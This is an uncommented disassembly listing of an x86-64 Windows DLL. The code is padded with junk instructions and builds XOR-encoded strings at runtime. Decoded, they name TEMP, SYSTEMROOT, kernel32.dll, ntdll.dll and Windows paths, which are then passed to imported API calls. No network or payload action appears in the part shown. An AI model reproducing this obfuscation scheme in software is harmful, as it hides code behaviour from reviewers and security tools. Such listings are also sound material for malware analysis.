   180002468:	90                   	nop
   180002469:	48 89 c0             	mov    %rax,%rax
   18000246c:	90                   	nop
   18000246d:	4d 8d 00             	lea    (%r8),%r8
   180002470:	48 89 c9             	mov    %rcx,%rcx
   180002473:	48 87 f6             	xchg   %rsi,%rsi
   180002476:	48 87 c9             	xchg   %rcx,%rcx
   180002479:	90                   	nop
   18000247a:	90                   	nop
   18000247b:	90                   	nop
   18000247c:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002480:	4d 8d 3f             	lea    (%r15),%r15
   180002483:	90                   	nop
   180002484:	41 56                	push   %r14
   180002486:	41 5e                	pop    %r14
   180002488:	41 50                	push   %r8
   18000248a:	48 89 db             	mov    %rbx,%rbx
   18000248d:	4d 89 c9             	mov    %r9,%r9
   180002490:	41 58                	pop    %r8
   180002492:	c7 44 24 04 54 01 00 	movl   $0x154,0x4(%rsp)
   180002499:	00 
   18000249a:	58                   	pop    %rax
   18000249b:	c3                   	ret
   18000249c:	0f 1f 40 00          	nopl   0x0(%rax)
   1800024a0:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   1800024a7:	c7 44 24 3c 1c 00 00 	movl   $0x1c,0x3c(%rsp)
   1800024ae:	00 
   1800024af:	56                   	push   %rsi
   1800024b0:	5e                   	pop    %rsi
   1800024b1:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800024b5:	b9 2a 03 00 00       	mov    $0x32a,%ecx
   1800024ba:	e8 a1 fa ff ff       	call   0x180001f60
   1800024bf:	41 57                	push   %r15
   1800024c1:	55                   	push   %rbp
   1800024c2:	5d                   	pop    %rbp
   1800024c3:	41 5f                	pop    %r15
   1800024c5:	ff 15 f5 3b 02 00    	call   *0x23bf5(%rip)        # 0x1800260c0
   1800024cb:	c7 44 24 30 29 00 00 	movl   $0x29,0x30(%rsp)
   1800024d2:	00 
   1800024d3:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800024d7:	83 f0 6a             	xor    $0x6a,%eax
   1800024da:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800024df:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800024e3:	83 f0 13             	xor    $0x13,%eax
   1800024e6:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800024eb:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800024ef:	83 f0 75             	xor    $0x75,%eax
   1800024f2:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800024f7:	66 c7 44 24 46 00 00 	movw   $0x0,0x46(%rsp)
   1800024fe:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002503:	ff 15 bf 3b 02 00    	call   *0x23bbf(%rip)        # 0x1800260c8
   180002509:	c7 44 24 40 5c 6b 39 	movl   $0x396b5c,0x40(%rsp)
   180002510:	00 
   180002511:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002515:	41 50                	push   %r8
   180002517:	53                   	push   %rbx
   180002518:	5b                   	pop    %rbx
   180002519:	41 58                	pop    %r8
   18000251b:	b9 03 02 00 00       	mov    $0x203,%ecx
   180002520:	e8 6b f2 ff ff       	call   0x180001790
   180002525:	48 8d 0d 32 03 02 00 	lea    0x20332(%rip),%rcx        # 0x18002285e
   18000252c:	ff 15 ee 3b 02 00    	call   *0x23bee(%rip)        # 0x180026120
   180002532:	41 55                	push   %r13
   180002534:	4d 89 ed             	mov    %r13,%r13
   180002537:	4d 8d 36             	lea    (%r14),%r14
   18000253a:	41 5d                	pop    %r13
   18000253c:	56                   	push   %rsi
   18000253d:	4d 87 c0             	xchg   %r8,%r8
   180002540:	5e                   	pop    %rsi
   180002541:	e8 5a f2 ff ff       	call   0x1800017a0
   180002546:	c7 44 24 2c 0e 00 00 	movl   $0xe,0x2c(%rsp)
   18000254d:	00 
   18000254e:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002552:	83 f0 5a             	xor    $0x5a,%eax
   180002555:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   18000255a:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000255e:	83 f0 4b             	xor    $0x4b,%eax
   180002561:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002566:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000256a:	83 f0 43             	xor    $0x43,%eax
   18000256d:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002572:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002576:	83 f0 5e             	xor    $0x5e,%eax
   180002579:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   18000257e:	66 c7 44 24 38 00 00 	movw   $0x0,0x38(%rsp)
   180002585:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000258a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000258f:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002595:	ff 15 3d 3b 02 00    	call   *0x23b3d(%rip)        # 0x1800260d8
   18000259b:	48 87 c9             	xchg   %rcx,%rcx
   18000259e:	4d 87 f6             	xchg   %r14,%r14
   1800025a1:	48 89 db             	mov    %rbx,%rbx
   1800025a4:	48 8d 36             	lea    (%rsi),%rsi
   1800025a7:	c7 44 24 40 f5 09 d7 	movl   $0xd709f5,0x40(%rsp)
   1800025ae:	00 
   1800025af:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800025b3:	41 57                	push   %r15
   1800025b5:	90                   	nop
   1800025b6:	41 5f                	pop    %r15
   1800025b8:	41 52                	push   %r10
   1800025ba:	53                   	push   %rbx
   1800025bb:	5b                   	pop    %rbx
   1800025bc:	41 5a                	pop    %r10
   1800025be:	41 56                	push   %r14
   1800025c0:	48 8d 3f             	lea    (%rdi),%rdi
   1800025c3:	41 5e                	pop    %r14
   1800025c5:	90                   	nop
   1800025c6:	90                   	nop
   1800025c7:	4d 89 ff             	mov    %r15,%r15
   1800025ca:	48 89 d2             	mov    %rdx,%rdx
   1800025cd:	51                   	push   %rcx
   1800025ce:	4d 89 f6             	mov    %r14,%r14
   1800025d1:	59                   	pop    %rcx
   1800025d2:	31 c0                	xor    %eax,%eax
   1800025d4:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   1800025db:	c3                   	ret
   1800025dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800025e0:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   1800025e7:	b9 5d 03 00 00       	mov    $0x35d,%ecx
   1800025ec:	e8 ff ee ff ff       	call   0x1800014f0
   1800025f1:	48 8d 36             	lea    (%rsi),%rsi
   1800025f4:	90                   	nop
   1800025f5:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800025fa:	31 c9                	xor    %ecx,%ecx
   1800025fc:	ff 15 76 3a 02 00    	call   *0x23a76(%rip)        # 0x180026078
   180002602:	41 53                	push   %r11
   180002604:	41 5b                	pop    %r11
   180002606:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000260b:	ff 15 ff 3b 02 00    	call   *0x23bff(%rip)        # 0x180026210
   180002611:	c7 44 24 50 c0 6f 75 	movl   $0x756fc0,0x50(%rsp)
   180002618:	00 
   180002619:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000261d:	4d 8d 24 24          	lea    (%r12),%r12
   180002621:	48 89 ed             	mov    %rbp,%rbp
   180002624:	48 87 ff             	xchg   %rdi,%rdi
   180002627:	48 87 db             	xchg   %rbx,%rbx
   18000262a:	e8 e1 ee ff ff       	call   0x180001510
   18000262f:	e8 cc f7 ff ff       	call   0x180001e00
   180002634:	b9 9b 02 00 00       	mov    $0x29b,%ecx
   180002639:	e8 b2 ec ff ff       	call   0x1800012f0
   18000263e:	41 57                	push   %r15
   180002640:	4d 89 e4             	mov    %r12,%r12
   180002643:	41 5f                	pop    %r15
   180002645:	e8 b6 f7 ff ff       	call   0x180001e00
   18000264a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000264f:	31 c9                	xor    %ecx,%ecx
   180002651:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002657:	ff 15 bb 3a 02 00    	call   *0x23abb(%rip)        # 0x180026118
   18000265d:	48 89 d2             	mov    %rdx,%rdx
   180002660:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180002665:	ff 15 f5 3a 02 00    	call   *0x23af5(%rip)        # 0x180026160
   18000266b:	48 89 c1             	mov    %rax,%rcx
   18000266e:	ff 15 74 3a 02 00    	call   *0x23a74(%rip)        # 0x1800260e8
   180002674:	52                   	push   %rdx
   180002675:	5a                   	pop    %rdx
   180002676:	41 55                	push   %r13
   180002678:	4d 89 ed             	mov    %r13,%r13
   18000267b:	41 5d                	pop    %r13
   18000267d:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002682:	ff 15 80 3b 02 00    	call   *0x23b80(%rip)        # 0x180026208
   180002688:	90                   	nop
   180002689:	48 87 f6             	xchg   %rsi,%rsi
   18000268c:	e8 7f fb ff ff       	call   0x180002210
   180002691:	c7 44 24 50 97 fe dc 	movl   $0xdcfe97,0x50(%rsp)
   180002698:	00 
   180002699:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000269d:	57                   	push   %rdi
   18000269e:	48 87 ed             	xchg   %rbp,%rbp
   1800026a1:	5f                   	pop    %rdi
   1800026a2:	53                   	push   %rbx
   1800026a3:	41 57                	push   %r15
   1800026a5:	41 5f                	pop    %r15
   1800026a7:	5b                   	pop    %rbx
   1800026a8:	4d 8d 3f             	lea    (%r15),%r15
   1800026ab:	48 87 db             	xchg   %rbx,%rbx
   1800026ae:	56                   	push   %rsi
   1800026af:	90                   	nop
   1800026b0:	5e                   	pop    %rsi
   1800026b1:	b9 2d 02 00 00       	mov    $0x22d,%ecx
   1800026b6:	e8 25 f9 ff ff       	call   0x180001fe0
   1800026bb:	c7 44 24 2c 77 00 00 	movl   $0x77,0x2c(%rsp)
   1800026c2:	00 
   1800026c3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026c7:	83 f0 24             	xor    $0x24,%eax
   1800026ca:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   1800026cf:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026d3:	83 f0 2e             	xor    $0x2e,%eax
   1800026d6:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800026db:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026df:	83 f0 24             	xor    $0x24,%eax
   1800026e2:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   1800026e7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026eb:	83 f0 23             	xor    $0x23,%eax
   1800026ee:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   1800026f3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800026f7:	83 f0 32             	xor    $0x32,%eax
   1800026fa:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   1800026ff:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002703:	83 f0 3a             	xor    $0x3a,%eax
   180002706:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   18000270b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000270f:	83 f0 25             	xor    $0x25,%eax
   180002712:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180002717:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000271b:	83 f0 38             	xor    $0x38,%eax
   18000271e:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180002723:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002727:	83 f0 38             	xor    $0x38,%eax
   18000272a:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   18000272f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002733:	83 f0 23             	xor    $0x23,%eax
   180002736:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000273b:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180002742:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002747:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000274c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002752:	ff 15 80 39 02 00    	call   *0x23980(%rip)        # 0x1800260d8
   180002758:	48 8d 09             	lea    (%rcx),%rcx
   18000275b:	4d 8d 3f             	lea    (%r15),%r15
   18000275e:	48 8d 1b             	lea    (%rbx),%rbx
   180002761:	90                   	nop
   180002762:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%rsp)
   180002769:	00 
   18000276a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000276f:	ff 15 4b 3a 02 00    	call   *0x23a4b(%rip)        # 0x1800261c0
   180002775:	48 8d 00             	lea    (%rax),%rax
   180002778:	c7 44 24 30 2e 00 00 	movl   $0x2e,0x30(%rsp)
   18000277f:	00 
   180002780:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002784:	83 f0 6d             	xor    $0x6d,%eax
   180002787:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000278c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002790:	83 f0 14             	xor    $0x14,%eax
   180002793:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180002798:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000279c:	83 f0 72             	xor    $0x72,%eax
   18000279f:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   1800027a4:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027a8:	83 f0 79             	xor    $0x79,%eax
   1800027ab:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   1800027b0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027b4:	83 f0 47             	xor    $0x47,%eax
   1800027b7:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   1800027bc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027c0:	83 f0 40             	xor    $0x40,%eax
   1800027c3:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   1800027c8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027cc:	83 f0 4a             	xor    $0x4a,%eax
   1800027cf:	66 89 44 24 5c       	mov    %ax,0x5c(%rsp)
   1800027d4:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027d8:	83 f0 41             	xor    $0x41,%eax
   1800027db:	66 89 44 24 5e       	mov    %ax,0x5e(%rsp)
   1800027e0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027e4:	83 f0 59             	xor    $0x59,%eax
   1800027e7:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1800027ec:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027f0:	83 f0 5d             	xor    $0x5d,%eax
   1800027f3:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   1800027f8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800027fc:	83 f0 72             	xor    $0x72,%eax
   1800027ff:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180002804:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002808:	83 f0 7d             	xor    $0x7d,%eax
   18000280b:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180002810:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002814:	83 f0 57             	xor    $0x57,%eax
   180002817:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   18000281c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002820:	83 f0 5d             	xor    $0x5d,%eax
   180002823:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   180002828:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000282c:	83 f0 5a             	xor    $0x5a,%eax
   18000282f:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   180002834:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002838:	83 f0 4b             	xor    $0x4b,%eax
   18000283b:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180002840:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002844:	83 f0 43             	xor    $0x43,%eax
   180002847:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   18000284c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002850:	83 f0 1d             	xor    $0x1d,%eax
   180002853:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   180002858:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000285c:	83 f0 1c             	xor    $0x1c,%eax
   18000285f:	66 89 44 24 74       	mov    %ax,0x74(%rsp)
   180002864:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002868:	83 f0 72             	xor    $0x72,%eax
   18000286b:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   180002870:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002874:	83 f0 45             	xor    $0x45,%eax
   180002877:	66 89 44 24 78       	mov    %ax,0x78(%rsp)
   18000287c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002880:	83 f0 4b             	xor    $0x4b,%eax
   180002883:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   180002888:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000288c:	83 f0 5c             	xor    $0x5c,%eax
   18000288f:	66 89 44 24 7c       	mov    %ax,0x7c(%rsp)
   180002894:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002898:	83 f0 40             	xor    $0x40,%eax
   18000289b:	66 89 44 24 7e       	mov    %ax,0x7e(%rsp)
   1800028a0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028a4:	83 f0 4b             	xor    $0x4b,%eax
   1800028a7:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   1800028ae:	00 
   1800028af:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028b3:	83 f0 42             	xor    $0x42,%eax
   1800028b6:	66 89 84 24 82 00 00 	mov    %ax,0x82(%rsp)
   1800028bd:	00 
   1800028be:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028c2:	83 f0 1d             	xor    $0x1d,%eax
   1800028c5:	66 89 84 24 84 00 00 	mov    %ax,0x84(%rsp)
   1800028cc:	00 
   1800028cd:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028d1:	83 f0 1c             	xor    $0x1c,%eax
   1800028d4:	66 89 84 24 86 00 00 	mov    %ax,0x86(%rsp)
   1800028db:	00 
   1800028dc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028e0:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   1800028e7:	00 
   1800028e8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028ec:	83 f0 4a             	xor    $0x4a,%eax
   1800028ef:	66 89 84 24 8a 00 00 	mov    %ax,0x8a(%rsp)
   1800028f6:	00 
   1800028f7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800028fb:	83 f0 42             	xor    $0x42,%eax
   1800028fe:	66 89 84 24 8c 00 00 	mov    %ax,0x8c(%rsp)
   180002905:	00 
   180002906:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000290a:	83 f0 42             	xor    $0x42,%eax
   18000290d:	66 89 84 24 8e 00 00 	mov    %ax,0x8e(%rsp)
   180002914:	00 
   180002915:	66 c7 84 24 90 00 00 	movw   $0x0,0x90(%rsp)
   18000291c:	00 00 00 
   18000291f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002924:	ff 15 b6 37 02 00    	call   *0x237b6(%rip)        # 0x1800260e0
   18000292a:	56                   	push   %rsi
   18000292b:	48 87 c9             	xchg   %rcx,%rcx
   18000292e:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180002932:	5e                   	pop    %rsi
   180002933:	e8 f8 e8 ff ff       	call   0x180001230
   180002938:	e8 d3 eb ff ff       	call   0x180001510
   18000293d:	c7 44 24 2c a0 00 00 	movl   $0xa0,0x2c(%rsp)
   180002944:	00 
   180002945:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002949:	35 e3 00 00 00       	xor    $0xe3,%eax
   18000294e:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002953:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002957:	35 9a 00 00 00       	xor    $0x9a,%eax
   18000295c:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002961:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002965:	35 fc 00 00 00       	xor    $0xfc,%eax
   18000296a:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   18000296f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002973:	35 f7 00 00 00       	xor    $0xf7,%eax
   180002978:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   18000297d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002981:	35 c9 00 00 00       	xor    $0xc9,%eax
   180002986:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   18000298b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000298f:	35 ce 00 00 00       	xor    $0xce,%eax
   180002994:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180002999:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000299d:	35 c4 00 00 00       	xor    $0xc4,%eax
   1800029a2:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   1800029a7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800029ab:	35 cf 00 00 00       	xor    $0xcf,%eax
   1800029b0:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1800029b5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800029b9:	35 d7 00 00 00       	xor    $0xd7,%eax
   1800029be:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800029c3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800029c7:	35 d3 00 00 00       	xor    $0xd3,%eax
   1800029cc:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800029d1:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   1800029d8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800029dd:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800029e2:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800029e8:	ff 15 22 37 02 00    	call   *0x23722(%rip)        # 0x180026110
   1800029ee:	90                   	nop
   1800029ef:	4d 89 ff             	mov    %r15,%r15
   1800029f2:	c7 44 24 50 ce 49 ed 	movl   $0xed49ce,0x50(%rsp)
   1800029f9:	00 
   1800029fa:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800029fe:	e8 fd f3 ff ff       	call   0x180001e00
   180002a03:	41 55                	push   %r13
   180002a05:	56                   	push   %rsi
   180002a06:	5e                   	pop    %rsi
   180002a07:	41 5d                	pop    %r13
   180002a09:	52                   	push   %rdx
   180002a0a:	5a                   	pop    %rdx
   180002a0b:	90                   	nop
   180002a0c:	4d 8d 24 24          	lea    (%r12),%r12
   180002a10:	4d 87 e4             	xchg   %r12,%r12
   180002a13:	48 89 d2             	mov    %rdx,%rdx
   180002a16:	48 87 ff             	xchg   %rdi,%rdi
   180002a19:	ff 15 a1 36 02 00    	call   *0x236a1(%rip)        # 0x1800260c0
   180002a1f:	90                   	nop
   180002a20:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   180002a27:	c3                   	ret
   180002a28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002a2f:	00 
   180002a30:	48 83 ec 48          	sub    $0x48,%rsp
   180002a34:	b9 1e 03 00 00       	mov    $0x31e,%ecx
   180002a39:	e8 d2 eb ff ff       	call   0x180001610
   180002a3e:	90                   	nop
   180002a3f:	4d 87 db             	xchg   %r11,%r11
   180002a42:	4d 8d 36             	lea    (%r14),%r14
   180002a45:	4d 89 db             	mov    %r11,%r11
   180002a48:	4d 8d 36             	lea    (%r14),%r14
   180002a4b:	e8 30 e6 ff ff       	call   0x180001080
   180002a50:	c7 44 24 2c 4f 00 00 	movl   $0x4f,0x2c(%rsp)
   180002a57:	00 
   180002a58:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a5c:	83 f0 21             	xor    $0x21,%eax
   180002a5f:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002a64:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a68:	83 f0 3b             	xor    $0x3b,%eax
   180002a6b:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002a70:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a74:	83 f0 2b             	xor    $0x2b,%eax
   180002a77:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002a7c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a80:	83 f0 23             	xor    $0x23,%eax
   180002a83:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002a88:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a8c:	83 f0 23             	xor    $0x23,%eax
   180002a8f:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180002a94:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002a98:	83 f0 61             	xor    $0x61,%eax
   180002a9b:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180002aa0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002aa4:	83 f0 2b             	xor    $0x2b,%eax
   180002aa7:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180002aac:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002ab0:	83 f0 23             	xor    $0x23,%eax
   180002ab3:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180002ab8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002abc:	83 f0 23             	xor    $0x23,%eax
   180002abf:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180002ac4:	66 c7 44 24 42 00 00 	movw   $0x0,0x42(%rsp)
   180002acb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002ad0:	ff 15 5a 36 02 00    	call   *0x2365a(%rip)        # 0x180026130
   180002ad6:	41 57                	push   %r15
   180002ad8:	41 53                	push   %r11
   180002ada:	41 5b                	pop    %r11
   180002adc:	41 5f                	pop    %r15
   180002ade:	90                   	nop
   180002adf:	4d 89 f6             	mov    %r14,%r14
   180002ae2:	90                   	nop
   180002ae3:	e8 28 f7 ff ff       	call   0x180002210
   180002ae8:	48 87 f6             	xchg   %rsi,%rsi
   180002aeb:	4d 89 db             	mov    %r11,%r11
   180002aee:	48 87 c9             	xchg   %rcx,%rcx
   180002af1:	48 8d 3f             	lea    (%rdi),%rdi
   180002af4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002af9:	ff 15 81 36 02 00    	call   *0x23681(%rip)        # 0x180026180
   180002aff:	48 89 c9             	mov    %rcx,%rcx
   180002b02:	4d 8d 36             	lea    (%r14),%r14
   180002b05:	4d 87 c9             	xchg   %r9,%r9
   180002b08:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002b0c:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180002b11:	31 c9                	xor    %ecx,%ecx
   180002b13:	31 d2                	xor    %edx,%edx
   180002b15:	ff 15 0d 36 02 00    	call   *0x2360d(%rip)        # 0x180026128
   180002b1b:	ff 15 5f 35 02 00    	call   *0x2355f(%rip)        # 0x180026080
   180002b21:	51                   	push   %rcx
   180002b22:	48 89 f6             	mov    %rsi,%rsi
   180002b25:	59                   	pop    %rcx
   180002b26:	4d 87 f6             	xchg   %r14,%r14
   180002b29:	c7 44 24 30 42 2e 92 	movl   $0x922e42,0x30(%rsp)
   180002b30:	00 
   180002b31:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002b35:	41 55                	push   %r13
   180002b37:	41 5d                	pop    %r13
   180002b39:	41 57                	push   %r15
   180002b3b:	48 8d 12             	lea    (%rdx),%rdx
   180002b3e:	48 8d 1b             	lea    (%rbx),%rbx
   180002b41:	41 5f                	pop    %r15
   180002b43:	41 56                	push   %r14
   180002b45:	90                   	nop
   180002b46:	41 5e                	pop    %r14
   180002b48:	4d 87 d2             	xchg   %r10,%r10
   180002b4b:	48 8d 12             	lea    (%rdx),%rdx
   180002b4e:	b9 d7 02 00 00       	mov    $0x2d7,%ecx
   180002b53:	e8 b8 e6 ff ff       	call   0x180001210
   180002b58:	41 54                	push   %r12
   180002b5a:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002b5e:	41 5c                	pop    %r12
   180002b60:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002b65:	ff 15 95 35 02 00    	call   *0x23595(%rip)        # 0x180026100
   180002b6b:	41 55                	push   %r13
   180002b6d:	41 5d                	pop    %r13
   180002b6f:	ff 15 23 35 02 00    	call   *0x23523(%rip)        # 0x180026098
   180002b75:	c7 44 24 30 2a 02 40 	movl   $0x40022a,0x30(%rsp)
   180002b7c:	00 
   180002b7d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002b81:	53                   	push   %rbx
   180002b82:	4d 89 db             	mov    %r11,%r11
   180002b85:	4d 87 ff             	xchg   %r15,%r15
   180002b88:	5b                   	pop    %rbx
   180002b89:	41 52                	push   %r10
   180002b8b:	41 50                	push   %r8
   180002b8d:	41 58                	pop    %r8
   180002b8f:	41 5a                	pop    %r10
   180002b91:	41 57                	push   %r15
   180002b93:	4d 8d 09             	lea    (%r9),%r9
   180002b96:	48 89 ed             	mov    %rbp,%rbp
   180002b99:	41 5f                	pop    %r15
   180002b9b:	41 53                	push   %r11
   180002b9d:	53                   	push   %rbx
   180002b9e:	5b                   	pop    %rbx
   180002b9f:	41 5b                	pop    %r11
   180002ba1:	55                   	push   %rbp
   180002ba2:	48 89 c9             	mov    %rcx,%rcx
